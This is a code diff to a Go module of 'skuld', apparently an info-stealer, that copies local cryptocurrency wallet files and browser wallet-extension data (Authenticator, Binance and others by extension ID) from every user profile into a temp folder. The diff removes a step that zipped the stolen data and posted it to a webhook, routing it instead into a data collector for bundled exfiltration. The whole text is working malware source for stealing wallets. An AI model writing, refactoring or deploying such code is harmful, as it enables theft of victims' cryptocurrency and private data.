@@ -8,15 +8,15 @@ import (
 	"github.com/hackirby/skuld/modules/browsers"
 	"github.com/hackirby/skuld/utils/fileutil"
 	"github.com/hackirby/skuld/utils/hardware"
-	"github.com/hackirby/skuld/utils/requests"
+	"github.com/hackirby/skuld/utils/collector"
 )
 
-func Run(webhook string) {
-	Local(webhook)
-	Extensions(webhook)
+func Run(dataCollector *collector.DataCollector) {
+	Local(dataCollector)
+	Extensions(dataCollector)
 }
 
-func Local(webhook string) {
+func Local(dataCollector *collector.DataCollector) {
 	users := hardware.GetUsers()
 	tempDir := fmt.Sprintf("%s\\wallets-temp", os.TempDir())
 	defer os.RemoveAll(tempDir)
@@ -58,23 +58,15 @@ func Local(webhook string) {
 		found = "Too many wallets to list."
 	}
 
-	tempZip := fmt.Sprintf("%s\\wallets.zip", os.TempDir())
-	if err := fileutil.Zip(tempDir, tempZip); err != nil {
-		return
+	// Add local wallets data to collector
+	walletsInfo := map[string]interface{}{
+		"WalletsFound": found,
 	}
-
-	defer os.RemoveAll(tempDir)
-	defer os.Remove(tempZip)
-
-	requests.Webhook(webhook, map[string]interface{}{
-		"embeds": []map[string]interface{}{{
-			"title":       "Wallets",
-			"description": "```" + found + "```",
-		}},
-	}, tempZip)
+	dataCollector.AddData("local_wallets", walletsInfo)
+	dataCollector.AddDirectory("local_wallets", tempDir, "local_wallets_data")
 }
 
-func Extensions(webhook string) {
+func Extensions(dataCollector *collector.DataCollector) {
 	Paths := map[string]string{
 		"Authenticator":   "\\Local Extension Settings\\bhghoamapcdpbohphigoooaddinpkbai",
 		"Binance":         "\\Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp",
@@ -214,15 +206,10 @@ func Extensions(webhook string) {
 		found = "Too many extensions to list."
 	}
 
-	tempZip := fmt.Sprintf("%s\\extensions.zip", os.TempDir())
-	if err := fileutil.Zip(tempDir, tempZip); err != nil {
-		return
+	// Add wallet extensions data to collector
+	extensionsInfo := map[string]interface{}{
+		"ExtensionsFound": found,
 	}
-	defer os.Remove(tempZip)
-	requests.Webhook(webhook, map[string]interface{}{
-		"embeds": []map[string]interface{}{{
-			"title":       "Extensions",
-			"description": "```" + found + "```",
-		}},
-	}, tempZip)
+	dataCollector.AddData("wallet_extensions", extensionsInfo)
+	dataCollector.AddDirectory("wallet_extensions", tempDir, "wallet_extensions_data")
 }
